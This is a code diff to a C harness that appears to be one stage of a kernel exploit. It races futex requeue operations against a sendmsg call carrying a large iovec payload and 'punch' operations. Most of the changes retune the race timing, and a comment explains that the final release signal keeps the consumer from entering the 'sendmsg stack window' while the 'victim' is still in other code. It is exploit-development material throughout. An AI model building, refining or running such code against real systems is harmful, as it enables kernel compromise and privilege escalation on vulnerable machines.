@@ -6,7 +6,7 @@
 #define S2_CONSUMER_WAIT_MS 10000
 #define S2_UNBLOCK_AFTER_MS 1000
 #define S2_WATCHDOG_TIMEOUT_MS 45000
-#define S2_IOV_TOTAL 0x10005u
+#define S2_IOV_TOTAL 0x10004u
 #define S2_SENDMSG_PENDING (-2)
 
 static uint32_t s2_f_wait;
@@ -22,19 +22,19 @@ static atomic_int s2_owner_chain_done;
 static atomic_int s2_owner_stop;
 static atomic_int s2_route_done;
 static atomic_int s2_waiter_tid;
-static atomic_int s2_go;
-static atomic_int s2_requeue_complete;
-static atomic_int s2_sendmsg_armed;
-static atomic_int s2_punch_allowed;
-static atomic_int s2_punch_calls;
-static atomic_int s2_punch_success;
-static atomic_int s2_punch_inflight;
-static atomic_int s2_sendmsg_ret;
-static atomic_int s2_sendmsg_errno;
-static atomic_int s2_futex_ret;
-static atomic_int s2_futex_errno;
-static atomic_int s2_requeue_ret;
-static atomic_int s2_requeue_errno;
+static volatile atomic_int s2_go;
+static volatile atomic_int s2_requeue_complete;
+static volatile atomic_int s2_sendmsg_armed;
+static volatile atomic_int s2_punch_allowed;
+static volatile atomic_int s2_punch_calls;
+static volatile atomic_int s2_punch_success;
+static volatile atomic_int s2_punch_inflight;
+static volatile atomic_int s2_sendmsg_ret;
+static volatile atomic_int s2_sendmsg_errno;
+static volatile atomic_int s2_futex_ret;
+static volatile atomic_int s2_futex_errno;
+static volatile atomic_int s2_requeue_ret;
+static volatile atomic_int s2_requeue_errno;
 
 static void s2_msleep(int ms) {
   struct timespec ts = {
@@ -51,7 +51,7 @@ static void s2_log_verdict(int pass, const char *reason) {
 __attribute__((noinline)) static int s2_carrier_contract_ok(
     const struct iovec *iov, const struct msghdr *mh,
     const unsigned char *name) {
-  if (!name || mh->msg_name != name || mh->msg_namelen != 32 ||
+  if (!iov || !name || mh->msg_name != name || mh->msg_namelen != 32 ||
       mh->msg_iov != iov ||
       mh->msg_iovlen != 8 || mh->msg_control != NULL ||
       mh->msg_controllen != 0 || mh->msg_flags != 0) {
@@ -356,10 +356,6 @@ static void *s2_waiter_thread(void *arg __attribute__((unused))) {
     return NULL;
   }
 
-  s2_msleep(S2_ARM_DELAY_MS);
-  atomic_store(&s2_punch_allowed, 1);
-  atomic_store(&s2_sendmsg_armed, 1);
-
   pr_info("H1A-S2 sendmsg armed tid=%d iov_total=%u delay_ms=%d\n",
           tid, S2_IOV_TOTAL, S2_ARM_DELAY_MS);
   if (!atomic_load(&s2_punch_allowed) ||
@@ -370,6 +366,12 @@ static void *s2_waiter_thread(void *arg __attribute__((unused))) {
     pr_warning("S2 sendmsg arm gate failed\n");
     return NULL;
   }
+  s2_msleep(S2_ARM_DELAY_MS);
+  atomic_store(&s2_punch_allowed, 1);
+  /* s2_sendmsg_armed is the final release signal: keep it immediately
+   * before the syscall so the consumer cannot enter the sendmsg stack
+   * window while the victim is still in logging or validation code. */
+  atomic_store(&s2_sendmsg_armed, 1);
   errno = 0;
   ret = (int)sendmsg(s2_sender_fd, &mh, MSG_NOSIGNAL);
   saved_errno = errno;
@@ -496,6 +498,7 @@ int slide_h1a_s2_test(void) {
   atomic_store(&s2_route_done, 0);
   atomic_store(&s2_waiter_tid, 0);
   atomic_store(&s2_go, 0);
+  atomic_store(&s2_requeue_complete, 0);
   atomic_store(&s2_sendmsg_armed, 0);
   atomic_store(&s2_punch_allowed, 0);
   atomic_store(&s2_punch_calls, 0);
